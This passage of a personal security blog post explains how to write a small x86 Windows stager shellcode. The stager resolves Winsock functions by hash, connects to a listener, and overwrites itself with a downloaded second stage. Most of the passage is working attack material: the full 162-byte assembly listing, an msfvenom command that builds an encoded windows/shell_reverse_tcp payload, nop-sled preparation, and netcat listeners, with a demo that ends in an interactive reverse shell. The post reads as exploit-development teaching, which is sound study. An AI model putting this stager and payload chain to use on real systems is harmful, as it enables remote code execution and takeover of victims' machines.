+<p>The first function we need to call is <code class="highlighter-rouge">socket</code>. For this function, we need to prepare the stack with the <code class="highlighter-rouge">af</code>, <code class="highlighter-rouge">type</code>, and <code class="highlighter-rouge">protocol</code> (in the reverse order) in a similar way as was done with the <code class="highlighter-rouge">C</code> code above. Since a socket descriptor is returned in <code class="highlighter-rouge">eax</code> (and we need to use this in subsequent calls), it is saved in <code class="highlighter-rouge">ebp</code> which is a ‘safe’ register in our shellcode:</p>
+<pre><code class="language-C">  xor eax, eax                  # set eax to null
+  push eax                      # protocol = 0
+  inc eax
+  push eax                      # type = 1 (SOCK_STREAM)
+  inc eax
+  push eax                      # af = 2 (AF_INET)
+  lodsd                         # load next function
+  call eax                      # call socket(2, 1, 0)
+  xchg ebp, eax                 # save socket
+</code></pre>
+
+<p>Once <code class="highlighter-rouge">socket</code> has been called and the returned descriptor stored in <code class="highlighter-rouge">ebp</code> we can prepare to call the <code class="highlighter-rouge">connect</code> function. We first need to create the <code class="highlighter-rouge">sockaddr</code> structure, by pushing the IP address to which the stage shellcode will connect to download the full shellcode.</p>
+
+<p>The IP address representation in the structure is created by taking each octet of the IP address, converting the decimal representation to hex, and then reversing the order. So for example using an IP address of 127.1.1.1 (which does not include null bytes):</p>
+<ul>
+  <li>hex(1) = <code class="highlighter-rouge">0x01</code></li>
+  <li>hex(1) = <code class="highlighter-rouge">0x01</code></li>
+  <li>hex(1) = <code class="highlighter-rouge">0x01</code></li>
+  <li>hex(127) = <code class="highlighter-rouge">0x7f</code></li>
+</ul>
+
+<p>Would result in the value of <code class="highlighter-rouge">0x0101017f</code> being pushed to the stack. Next, we need to complete the structure layout by specifying the <code class="highlighter-rouge">sin_port</code> and <code class="highlighter-rouge">sin_family</code> which are <code class="highlighter-rouge">short</code>’s.</p>
+
+<p>The <code class="highlighter-rouge">sin_port</code> follows a similar process, of taking the hex representation of the port to connect to, and then reversing the endianness. So for example using a port of 6969:</p>
+<ul>
+  <li>hex(6969) = <code class="highlighter-rouge">0x1b39</code></li>
+</ul>
+
+<p>So the <code class="highlighter-rouge">sin_port</code> short would be <code class="highlighter-rouge">0x391b</code>. The <code class="highlighter-rouge">sin_family</code> is <code class="highlighter-rouge">0x2</code>, however we need to avoid null bytes in our shellcode. What we can do, is use <code class="highlighter-rouge">0xff02</code> as our <code class="highlighter-rouge">sin_family</code> short, and then use <code class="highlighter-rouge">xor</code> on the higher 8 bits of the register, to convert the <code class="highlighter-rouge">0xff</code> to <code class="highlighter-rouge">0x00</code>.</p>
+
+<p>Once the structure is created on the stack, we can push the location to the stack as a parameter (since we need a pointer to the structure), and also push the socket descriptor still stored in <code class="highlighter-rouge">ebp</code>. As discussed, we don’t need to specify the <code class="highlighter-rouge">namelen</code> explicitly. Due to how we setup the stack, we already have a significantly large <code class="highlighter-rouge">namelen</code> value on the stack already, and the <code class="highlighter-rouge">connect</code> function doesn’t care about that specific value (as long as it’s large enough):</p>
+<pre><code class="language-C">  push 0x0101017f              # IP:127.1.1.1
+  mov eax, 0x391bff02          # PORT:6969 + 2 (AF_INET)
+  xor ah, ah                   # clear 0xff (null bytes)
+  push eax
+  push esp                     # socket addr struct
+  push ebp                     # socket
+  lodsd                        # load next function
+  call eax                     # call connect(socket handle, socket addr struct, large size)
+</code></pre>
+
+<p>Lastly, we need to receive data via the socket and execute it. We can use the <code class="highlighter-rouge">0x0</code> return value in <code class="highlighter-rouge">eax</code> for the flags parameter (since <code class="highlighter-rouge">0x0</code> is returned by the <code class="highlighter-rouge">connect</code> function on success). For the next parameter we need another ‘large enough’ receive <code class="highlighter-rouge">len</code>gth value (we can use the current <code class="highlighter-rouge">esp</code> value for this).</p>
+
+<p>Next we need to identify where our data will write to (i.e., what will the <code class="highlighter-rouge">recv</code> <code class="highlighter-rouge">buf</code> value be). Since we already know the location in memory of our shellcode (since we are reading the stored function addresses via <code class="highlighter-rouge">lodsd</code>) we can just overwrite our existing stage shellcode (using the known location) rather than identifying a new memory location.</p>
+
+<p>Due to the use of the initial <code class="highlighter-rouge">call $+4</code> instruction, we also need to stack align <code class="highlighter-rouge">esi</code> before calling the <code class="highlighter-rouge">recv</code> function (otherwise the function will fail) and we will also need to make sure we prepend our second stage shellcode with <code class="highlighter-rouge">nop</code>’s (since execution will continue in place after the <code class="highlighter-rouge">recv</code> function executes).</p>
+
+<p>After <code class="highlighter-rouge">recv</code> is executed, our current staging shellcode will be overwritten by the staged shellcode and execution will continue to the next instruction (which has been loaded and written via <code class="highlighter-rouge">recv</code>):</p>
+<pre><code class="language-C">  push eax                     # flags (eax is 0 on success)
+  push esp                     # large length
+  lodsd                        # load next function
+  dec esi                      # align esi for write address
+  push esi                     # buffer (write over self)
+  push ebp                     # socket
+  call eax                     # call recv(socket, buffer, large length, flags)
+</code></pre>
+
+<p>Enough text, let’s see this in action.</p>
+
+<h2 id="demo">Demo</h2>
+<p>There are a few steps needed to use and interface with this shellcode.</p>
+
+<p>First, we need to create our staged shellcode (which our stage stub will load and execute). We can reuse the <code class="highlighter-rouge">meterpreter</code> payload from above by storing the raw shellcode to an output file: 
+<code class="highlighter-rouge">msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=192.168.49.83 LPORT=1234 -e x86/shikata_ga_nai -b "\x00" -f raw &gt; met_reverse.bin</code></p>
+
+<p>Due to the stage shellcode ‘overwriting itself’ we need to prepend our shellcode with <code class="highlighter-rouge">nops</code> (otherwise, we will start execution from the middle of the staged shellcode, which won’t work):<br />
+<code class="highlighter-rouge">echo -ne \x90\x90\x90\x90\&lt;snip&gt;\x90\x90\x90\x90 | xxd -r -p &gt; nop_prepend.bin</code></p>
+
+<p>The <code class="highlighter-rouge">meterpreter</code> shellcode can then be prepended with the <code class="highlighter-rouge">nop</code> sled:
+<code class="highlighter-rouge">cat met_reverse.bin &gt;&gt; nop_prepend.bin</code></p>
+
+<p>With the payloads prepared, we next need to setup 2 listeners with <code class="highlighter-rouge">netcat</code>. One for the shellcode stage, and one to handle the actual <code class="highlighter-rouge">meterpreter</code> reverse shell:</p>
+<ol>
+  <li><code class="highlighter-rouge">nc -lvp 6969 &lt; nop_prepend.bin</code></li>
+  <li><code class="highlighter-rouge">nc -lvp 1234</code></li>
+</ol>
+
+<p>After ‘exploiting something’, we can begin executing our stage shellcode. Firstly, we resolve our shellcode location in memory. We can see that before executing the <code class="highlighter-rouge">call $+4</code> instruction the assembly doesn’t look promising with the far return:
+<a href="/assets/images/Pasted image 20220912095730.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220912095730.png" alt="" /></a></p>
+
+<p>However, after executing the call instruction, the short call will ‘update’ the instructions due to the ‘new’ execution point:
+<a href="/assets/images/Pasted image 20220912100031.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220912100031.png" alt="" /></a></p>
+
+<p>We can now execute ‘over’ our <code class="highlighter-rouge">nop</code>-like function hashes (which don’t impact the execution flow), <code class="highlighter-rouge">pop</code> the location of the hashes into <code class="highlighter-rouge">eax</code>, use <code class="highlighter-rouge">esi</code> to find <code class="highlighter-rouge">kernel32</code>’s base address, load the base address of <code class="highlighter-rouge">ws2_32</code> and locate the functions we are interested in.</p>
+
+<p>Once the functions have been resolved we can start to use them, starting with <code class="highlighter-rouge">socket</code>. We can see the call stack for the <code class="highlighter-rouge">socket(2, 1, 0)</code> function call, with the socket descriptor (<code class="highlighter-rouge">0x114</code>) returned to us in <code class="highlighter-rouge">eax</code> after execution:</p>
+
+<p><a href="/assets/images/Pasted image 20220912100459.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220912100459.png" alt="" /></a></p>
+
+<p><a href="/assets/images/Pasted image 20220912100621.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220912100621.png" alt="" /></a></p>
+
+<p>Next, we setup the stack to call <code class="highlighter-rouge">connect(socket handle, socket addr struct, large size)</code>. We can see from the stack that the shellcode is using the descriptor from the <code class="highlighter-rouge">socket</code> call, the <code class="highlighter-rouge">socket addr</code> struct location of <code class="highlighter-rouge">0x0019FC3C</code> and part of the actual structure as the size (<code class="highlighter-rouge">esp+8</code> == <code class="highlighter-rouge">0x0019FC3C</code>):</p>
+
+<p><a href="/assets/images/Pasted image 20220912100734.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220912100734.png" alt="" /></a></p>
+
+<p>The structure content is slightly different to the example above with a different internal IP address, however the method to create the value is the same.</p>
+
+<p>Once the <code class="highlighter-rouge">call</code> instruction has executed, we can see that the shellcode makes a reverse connection to our <code class="highlighter-rouge">netcat</code> listener:
+<a href="/assets/images/Pasted image 20220912101200.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220912101200.png" alt="" /></a></p>
+
+<p>Lastly, we prepare to make the <code class="highlighter-rouge">recv(socket, buffer, large length, flags)</code> function call. We again see the familiar socket descriptor, along with the write location (into our current shellcode address in memory) as well as a ‘large enough’ length (based on the value of <code class="highlighter-rouge">esp</code>), and null flags on the stack:</p>
+
+<p><a href="/assets/images/Pasted image 20220912101514.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220912101514.png" alt="" /></a></p>
+
+<p>Before executing the <code class="highlighter-rouge">recv</code> instruction, we can see our stage shellcode executing in memory and reaching the final assembly instruction before null memory: 
+<a href="/assets/images/Pasted image 20220912101633.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220912101633.png" alt="" /></a></p>
+
+<p>After execution of the <code class="highlighter-rouge">recv</code> call, we read data from the socket and updated the instructions currently executing in memory:
+<a href="/assets/images/Pasted image 20220912101831.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220912101831.png" alt="" /></a></p>
+
+<p>We can now see the purpose of the <code class="highlighter-rouge">nop</code> requirement. The <code class="highlighter-rouge">nop</code>s allow us to continue execution and slide down to the now loaded and staged <code class="highlighter-rouge">meterpreter</code> shellcode.</p>
+
+<p>If we continue execution in the debugger, the <code class="highlighter-rouge">meterpreter</code> shellcode will now execute and we receive an interactive and complete reverse shell on our <code class="highlighter-rouge">netcat</code> listener:
+<a href="/assets/images/Pasted image 20220912102028.png" data-lightbox="1"><img src="/assets/images/Pasted image 20220912102028.png" alt="" /></a></p>
+
+<h2 id="proposed-solution">Proposed solution</h2>
+<p>In total, the proposed solution to this problem (which meets our defined requirements above) is 162 bytes, and a full listing is provided below:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span>  <span class="o">=</span> <span class="s">b"</span><span class="se">\xe8\xff\xff\xff\xff</span><span class="s">"</span>  <span class="c1"># call $+4
+</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">b"</span><span class="se">\xc2</span><span class="s">"</span>                  <span class="c1"># key 248   -&gt; LoadLibraryA \xff\xc2 -&gt; (inc edx)
+</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">b"</span><span class="se">\x37</span><span class="s">"</span>                  <span class="c1"># key 192   -&gt; socket       (aaa)
+</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">b"</span><span class="se">\x96</span><span class="s">"</span>                  <span class="c1"># key 192   -&gt; connect      (xchg esi, eax)
+</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="s">b"</span><span class="se">\x90</span><span class="s">"</span>                  <span class="c1"># key 192   -&gt; recv         (nop)
+</span></code></pre></div></div>
+
+<pre><code class="language-C">  pop eax                      # eax = shellcode location
+  cdq                          # edx = 0 (eax points to is less than 0x80000000)
+  xchg eax, esi                # esi = addr of first function hash
+  lea edi, [esi-0xc]           # edi = addr of start writing function address
+
+  mov ebx, fs:[edx+0x30]       # ebx = address of PEB
+  mov ecx, [ebx+0xc]           # ecx = pointer to loader data
+  mov ecx, [ecx+0x1c]          # ecx = first entry in initialisation order list
+  mov ecx, [ecx]               # ecx = second entry in list
+  mov ecx, [ecx]               # ecx = third entry in list (kernel32.dll)
+  mov ebp, [ecx+0x8]           # ebp = base address of kernel32.dll
+
+  mov dx, 0x3233
+  push edx
+  push 0x5f327377
+  push esp                     # push ws2_32 on stack
+  mov dh, 0xf8                 # hash key for kernel32.dll (248)
+
+  find_lib_functions:
+    lodsb                      # load next hash into al and increment esi
+    cmp al, 0x37               # hash of socket - trigger loadlibrary(ws2_32)
+    jne find_functions
+    xchg eax, ebp              # save current hash
+    call [edi-0x4]             # call loadlibrary (ws2_32)
+    xchg eax, ebp              # restore current hash, and update ebp
+    push edi                   # save location of addr of accept
+    mov dh, 0xc0               # hash key for ws_32.dll (192)
+
+  find_functions:
+    pushad                     # preserve registers
+    mov eax, [ebp+0x3c]        # eax = start of PE header
+    mov ecx, [ebp + eax + 0x78]# ecx = relative offset of export table
+    add ecx, ebp               # ecx = absolute addr of export table
+    mov ebx, [ecx + 0x20]      # ebx = relative offset of names table
+    add ebx, ebp               # ebx = absolute addr of names table
+    xor edi, edi               # edi will count through the functions
+
+  next_function_loop:
+    inc edi                    # increment function counter
+    mov esi, [ebx + edi * 4]   # esi = relative offset of current function name
+    add esi, ebp               # esi = absolute addr of current function name
+    xor dl, dl                 # reset hash counter
+
+  hash_loop:
+   lodsb                       # load next char into al and increment esi
+   xor al, dh                  # xor character in al with key in dh
+   sub dl, al                  # update hash with current char
+   cmp al, dh                  # loop until we reach end of string
+   jne hash_loop
+   cmp dl, [esp + 0x1c]        # compare to the requested hash (saved on stack from pushad)
+   jnz next_function_loop
+
+  # we now have the right function
+  mov ebx, [ecx + 0x24]        # ebx = relative offset of ordinals table
+  add ebx, ebp                 # ebx = absolute addr of ordinals table
+  mov di, [ebx + 2 * edi]      # di = ordinal number of matched function
+  mov ebx, [ecx + 0x1c]        # ebx = relative offset of address table
+  add ebx, ebp                 # ebx = absolute addr of address table
+  add ebp, [ebx + 4 * edi]     # add to ebp (base addr of module) the relative offset
+  xchg eax, ebp                # move func addr into eax
+  pop edi                      # edi is last onto stack in pushad write 
+  stosd                        # functon addr to [edi] and increment edi
+  push edi
+  popad                        # restore registers
+  cmp esi, edi                 # loop until we reach end of last hash
+  jne find_lib_functions
+  pop esi                      # saved location of first ws2_32 function
+
+  xor eax, eax                 # set eax to null
+  push eax                     # protocol = 0
+  inc eax
+  push eax                     # type = 1 (SOCK_STREAM)
+  inc eax
+  push eax                     # af = 2 (AF_INET)
+  lodsd                        # load next function
+  call eax                     # call socket(2, 1, 0)
+  xchg ebp, eax                # save socket
+
+  push 0x0101017f              # IP:127.1.1.1
+  mov eax, 0x391bff02          # PORT:6969 + 2 (AF_INET)
+  xor ah, ah                   # clear 0xff (null bytes)
+  push eax
+  push esp                     # socket addr struct
+  push ebp                     # socket
+  lodsd                        # load next function
+  call eax                     # call connect(socket handle, socket addr struct, large size)
+
+  push eax                     # flags (eax is 0 on success)
+  push esp                     # large length
+  lodsd                        # load next function
+  dec esi                      # align esi for write address
+  push esi                     # buffer (write over self)
+  push ebp                     # socket
+  call eax                     # call recv(socket, buffer, large length, flags)
+</code></pre>
+
+<p>If you know of any more tips or tricks to make the shellcode even shorter or more efficient, please let me know!</p>
+
+</div>
+<div id="related">
+  <h3>Recent Posts</h3>
+  <ul id="blog-posts" class="posts">
+    
+    <li>
+      <span>21 Jun 2022</span> <a href="/2022/06/21/shared-section-code-execution/">Shared section code execution</a>
+    </li>
+    
+    <li>
+      <span>10 Jun 2022</span> <a href="/2022/06/10/obfuscating-shellcode-entropy/">Obfuscating shellcode entropy</a>
+    </li>
+    
+    <li>
+      <span>08 Jul 2018</span> <a href="/2018/07/08/solving-CTF-challenges-with-DLL-injection/">Solving CTF challenges with DLL injection</a>
+    </li>
+    
+  </ul>
+</div>
+
+      <div class="footer">
+        <div class="disclaimer">
+  
+  <p>
+    The postings on this site are my own and don't represent my employer
+  </p>
+  
+</div>
+
+      </div>
+    </div>
+  </div>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox-plus-jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js"></script>
+<!--
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-41399516-1', 'auto');
+    ga('send', 'pageview');
+  </script>
+-->
+</body>
+</html>
